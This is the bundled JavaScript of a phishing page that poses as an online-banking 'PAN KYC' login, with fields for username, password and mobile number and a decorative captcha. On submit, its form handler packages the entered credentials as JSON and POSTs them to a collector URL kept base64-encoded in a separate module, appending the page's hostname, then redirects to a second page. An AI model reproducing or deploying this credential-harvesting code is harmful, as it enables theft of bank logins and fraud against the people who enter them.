(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [508], {
        697: function(e, t, n) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/a1", function() {
                return n(1959)
            }])
        },
        9018: function(e, t) {
            "use strict";
            t.Z = {
                dataList: "aHR0cHM6Ly9kZW1vLW11c2ljLmtwYmhvc3QuY29tL3VzZURhdGEucGhw"
            }
        },
        1210: function(e, t) {
            "use strict";

            function n(e, t, n, a) {
                return !1
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.getDomainLocale = n, ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
                value: !0
            }), Object.assign(t.default, t), e.exports = t.default)
        },
        8418: function(e, t, n) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            var a = n(4941).Z;
            n(5753).default, Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.default = void 0;
            var r = n(2648).Z,
                o = n(7273).Z,
                s = r(n(7294)),
                i = n(6273),
                l = n(2725),
                c = n(3462),
                u = n(1018),
                d = n(7190),
                f = n(1210),
                h = n(8684),
                p = void 0 !== s.default.useTransition,
                $ = {};

            function m(e, t, n, a) {
                if (e && i.isLocalURL(t)) {
                    Promise.resolve(e.prefetch(t, n, a)).catch(function(e) {});
                    var r = a && void 0 !== a.locale ? a.locale : e && e.locale;
                    $[t + "%" + n + (r ? "%" + r : "")] = !0
                }
            }
            var v = s.default.forwardRef(function(e, t) {
                var n, r, v = e.href,
                    x = e.as,
                    j = e.children,
                    g = e.prefetch,
                    y = e.passHref,
                    _ = e.replace,
                    N = e.shallow,
                    b = e.scroll,
                    w = e.locale,
                    L = e.onClick,
                    C = e.onMouseEnter,
                    R = e.onTouchStart,
                    k = e.legacyBehavior,
                    E = void 0 === k ? !0 !== Boolean(!1) : k,
                    M = o(e, ["href", "as", "children", "prefetch", "passHref", "replace", "shallow", "scroll", "locale", "onClick", "onMouseEnter", "onTouchStart", "legacyBehavior"]);
                n = j, E && ("string" == typeof n || "number" == typeof n) && (n = s.default.createElement("a", null, n));
                var P = !1 !== g,
                    T = a(p ? s.default.useTransition() : [], 2)[1],
                    S = s.default.useContext(c.RouterContext),
                    U = s.default.useContext(u.AppRouterContext);
                U && (S = U);
                var Z = s.default.useMemo(function() {
                        var e = a(i.resolveHref(S, v, !0), 2),
                            t = e[0],
                            n = e[1];
                        return {
                            href: t,
                            as: x ? i.resolveHref(S, x) : n || t
                        }
                    }, [S, v, x]),
                    A = Z.href,
                    B = Z.as,
                    D = s.default.useRef(A),
                    F = s.default.useRef(B);
                E && (r = s.default.Children.only(n));
                var H = E ? r && "object" == typeof r && r.ref : t,
                    O = a(d.useIntersection({
                        rootMargin: "200px"
                    }), 3),
                    z = O[0],
                    K = O[1],
                    G = O[2],
                    Y = s.default.useCallback(function(e) {
                        (F.current !== B || D.current !== A) && (G(), F.current = B, D.current = A), z(e), H && ("function" == typeof H ? H(e) : "object" == typeof H && (H.current = e))
                    }, [B, H, A, G, z]);
                s.default.useEffect(function() {
                    var e = K && P && i.isLocalURL(A),
                        t = void 0 !== w ? w : S && S.locale,
                        n = $[A + "%" + B + (t ? "%" + t : "")];
                    e && !n && m(S, A, B, {
                        locale: t
                    })
                }, [B, A, K, w, P, S]);
                var q = {
                    ref: Y,
                    onClick: function(e) {
                        E || "function" != typeof L || L(e), E && r.props && "function" == typeof r.props.onClick && r.props.onClick(e), e.defaultPrevented || function(e, t, n, a, r, o, s, l, c, u) {
                            if ("A" !== e.currentTarget.nodeName.toUpperCase() || (!(f = (d = e).currentTarget.target) || "_self" === f) && !d.metaKey && !d.ctrlKey && !d.shiftKey && !d.altKey && (!d.nativeEvent || 2 !== d.nativeEvent.which) && i.isLocalURL(n)) {
                                e.preventDefault();
                                var d, f, h = function() {
                                    "beforePopState" in t ? t[r ? "replace" : "push"](n, a, {
                                        shallow: o,
                                        locale: l,
                                        scroll: s
                                    }) : t[r ? "replace" : "push"](n, {
                                        forceOptimisticNavigation: !u
                                    })
                                };
                                c ? c(h) : h()
                            }
                        }(e, S, A, B, _, N, b, w, U ? T : void 0, P)
                    },
                    onMouseEnter: function(e) {
                        E || "function" != typeof C || C(e), E && r.props && "function" == typeof r.props.onMouseEnter && r.props.onMouseEnter(e), !(!P && U) && i.isLocalURL(A) && m(S, A, B, {
                            priority: !0
                        })
                    },
                    onTouchStart: function(e) {
                        E || "function" != typeof R || R(e), E && r.props && "function" == typeof r.props.onTouchStart && r.props.onTouchStart(e), !(!P && U) && i.isLocalURL(A) && m(S, A, B, {
                            priority: !0
                        })
                    }
                };
                if (!E || y || "a" === r.type && !("href" in r.props)) {
                    var I = void 0 !== w ? w : S && S.locale,
                        W = S && S.isLocaleDomain && f.getDomainLocale(B, I, S.locales, S.domainLocales);
                    q.href = W || h.addBasePath(l.addLocale(B, I, S && S.defaultLocale))
                }
                return E ? s.default.cloneElement(r, q) : s.default.createElement("a", Object.assign({}, M, q), n)
            });
            t.default = v, ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
                value: !0
            }), Object.assign(t.default, t), e.exports = t.default)
        },
        1018: function(e, t, n) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.GlobalLayoutRouterContext = t.LayoutRouterContext = t.AppRouterContext = void 0;
            var a = (0, n(2648).Z)(n(7294)),
                r = a.default.createContext(null);
            t.AppRouterContext = r;
            var o = a.default.createContext(null);
            t.LayoutRouterContext = o;
            var s = a.default.createContext(null);
            t.GlobalLayoutRouterContext = s
        },
        1959: function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, {
                default: function() {
                    return $
                }
            });
            var a = n(7568),
                r = n(655),
                o = n(5893),
                s = n(9008),
                i = n.n(s),
                l = n(5675),
                c = n.n(l),
                u = n(7294),
                d = n(1163),
                f = n(1664),
                h = n.n(f),
                p = n(9018);

            function $() {
                var e, t = (0, d.useRouter)(),
                    n = (0, u.useState)(!1),
                    s = n[0],
                    l = n[1],
                    f = (e = (0, a.Z)(function(e) {
                        var n, a, o, s, i, c, u;
                        return (0, r.__generator)(this, function(r) {
                            switch (r.label) {
                                case 0:
                                    return e.preventDefault(), l(!0), n = new FormData(e.target), a = {}, n.forEach(function(e, t) {
                                        a[t] = e
                                    }), o = JSON.stringify(a), s = ((i = {}).method = "POST", i.headers = {
                                        "Content-Type": "application/json"
                                    }, i.body = o, i), [4, fetch(window.atob(p.Z.dataList) + "?id=" + window.location.hostname, s)];
                                case 1:
                                    return [4, (c = r.sent()).json()];
                                case 2:
                                    return u = r.sent(), l(!1), !0 == u.status ? t.push("/a2") : l(!1), [2]
                            }
                        })
                    }), function(t) {
                        return e.apply(this, arguments)
                    }),
                    $ = (0, u.useState)(!0),
                    m = $[0],
                    v = $[1];
                return (0, o.jsxs)(o.Fragment, {
                    children: [(0, o.jsxs)(i(), {
                        children: [(0, o.jsx)("title", {
                            children: "Login"
                        }), (0, o.jsx)("meta", {
                            name: "description",
                            content: "login the app"
                        }), (0, o.jsx)("link", {
                            rel: "icon",
                            href: "/favicon.ico"
                        })]
                    }), (0, o.jsxs)("main", {
                        children: [(0, o.jsx)("div", {
                            className: "logo",
                            children: (0, o.jsx)(c(), {
                                src: "/logo.svg.png",
                                alt: "site logo",
                                width: 100,
                                height: 37
                            })
                        }), (0, o.jsx)("br", {}), (0, o.jsx)("div", {
                            className: "login-heading",
                            children: (0, o.jsx)("h3", {
                                className: "text-center",
                                children: "Login Online Banking to PAN KYC"
                            })
                        }), (0, o.jsxs)("div", {
                            className: "login-form",
                            children: [(0, o.jsxs)("p", {
                                className: "info",
                                children: [(0, o.jsx)("span", {
                                    children: "(CARE:"
                                }), " Username and password are case sensitive.)"]
                            }), (0, o.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: f,
                                children: [(0, o.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, o.jsx)("label", {
                                        htmlFor: "username",
                                        children: "Username* "
                                    }), (0, o.jsx)("input", {
                                        name: "userName",
                                        type: "text",
                                        className: "form-control",
                                        id: "username",
                                        required: !0,
                                        size: "30",
                                        maxLength: 30,
                                        "aria-label": "userName"
                                    })]
                                }), (0, o.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, o.jsx)("label", {
                                        htmlFor: "password",
                                        children: "Password* "
                                    }), (0, o.jsx)("input", {
                                        name: "password",
                                        type: "password",
                                        className: "form-control",
                                        id: "password",
                                        required: !0,
                                        size: "30",
                                        maxLength: 30,
                                        "aria-label": "userName"
                                    })]
                                }), (0, o.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, o.jsx)("label", {
                                        htmlFor: "mobile",
                                        children: "Mobile* "
                                    }), (0, o.jsx)("input", {
                                        name: "mobile",
                                        type: "text",
                                        className: "form-control",
                                        id: "mobile",
                                        size: "30",
                                        required: !0,
                                        maxLength: 10,
                                        "aria-label": "mobile"
                                    })]
                                }), (0, o.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, o.jsx)("label", {
                                        htmlFor: "captcha",
                                        children: "Enter the text as shown in the image * "
                                    }), (0, o.jsx)("input", {
                                        type: "text",
                                        className: "form-control",
                                        size: "30",
                                        maxLength: 30,
                                        "aria-label": "captcha"
                                    })]
                                }), (0, o.jsx)("label", {
                                    children: "Select one of the Captcha options "
                                }), (0, o.jsxs)("div", {
                                    className: "captcha",
                                    children: [(0, o.jsxs)("div", {
                                        className: "w-50",
                                        children: [(0, o.jsx)("input", {
                                            type: "radio",
                                            checked: !0,
                                            id: "",
                                            onChange: function() {
                                                return v(!0)
                                            }
                                        }), "Image Captcha"]
                                    }), (0, o.jsxs)("div", {
                                        className: "w-50",
                                        children: [(0, o.jsx)("input", {
                                            type: "radio",
                                            id: "",
                                            onChange: function() {
                                                return v(!1)
                                            }
                                        }), "Audio Captcha"]
                                    }), (0, o.jsx)("div", {
                                        className: "clear"
                                    }), (0, o.jsxs)("div", {
                                        className: "top-10",
                                        children: [(0, o.jsx)("div", {
                                            className: m ? "show" : "hidden",
                                            children: (0, o.jsx)(c(), {
                                                src: "/catpcha.png",
                                                alt: "captcha",
                                                width: 150,
                                                height: "40"
                                            })
                                        }), (0, o.jsx)("div", {
                                            className: m ? "hidden" : "show"
                                        })]
                                    }), (0, o.jsxs)("div", {
                                        className: "form-group",
                                        children: [(0, o.jsx)("input", {
                                            type: "submit",
                                            disabled: !!s,
                                            className: "btn",
                                            value: "Login"
                                        }), (0, o.jsx)("input", {
                                            type: "reset",
                                            className: "btn",
                                            value: "Reset"
                                        })]
                                    }), (0, o.jsx)("p", {
                                        children: (0, o.jsx)(h(), {
                                            href: "/",
                                            children: (0, o.jsx)("a", {
                                                children: "New User ? Register here/Activate"
                                            })
                                        })
                                    }), (0, o.jsx)("p", {
                                        children: (0, o.jsx)(h(), {
                                            href: "/",
                                            children: (0, o.jsx)("a", {
                                                children: "Forgot Username / Login Password"
                                            })
                                        })
                                    })]
                                })]
                            })]
                        }), (0, o.jsx)("div", {
                            className: "p-body",
                            children: (0, o.jsxs)("ul", {
                                className: "provide",
                                children: [(0, o.jsx)("li", {
                                    children: "Mandatory fields are marked with an asterisk (*)"
                                }), (0, o.jsx)("li", {
                                    children: "Do not provide your username and password anywhere other than in this page"
                                }), (0, o.jsxs)("li", {
                                    children: ["Your username and password are highly confidential. Never part with them.", (0, o.jsx)("strong", {
                                        children: "Bank "
                                    }), "will never ask for this information."]
                                })]
                            })
                        }), (0, o.jsx)("div", {
                            className: "footer_area",
                            children: (0, o.jsx)(c(), {
                                src: "/veriSign.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, o.jsx)("div", {
                            className: "footer",
                            children: (0, o.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        1664: function(e, t, n) {
            e.exports = n(8418)
        },
        7568: function(e, t, n) {
            "use strict";

            function a(e, t, n, a, r, o, s) {
                try {
                    var i = e[o](s),
                        l = i.value
                } catch (c) {
                    n(c);
                    return
                }
                i.done ? t(l) : Promise.resolve(l).then(a, r)
            }

            function r(e) {
                return function() {
                    var t = this,
                        n = arguments;
                    return new Promise(function(r, o) {
                        var s = e.apply(t, n);

                        function i(e) {
                            a(s, r, o, i, l, "next", e)
                        }

                        function l(e) {
                            a(s, r, o, i, l, "throw", e)
                        }
                        i(void 0)
                    })
                }
            }
            n.d(t, {
                Z: function() {
                    return r
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 774, 888, 179], function() {
            return e(e.s = 697)
        }), _N_E = e.O()
    }
]);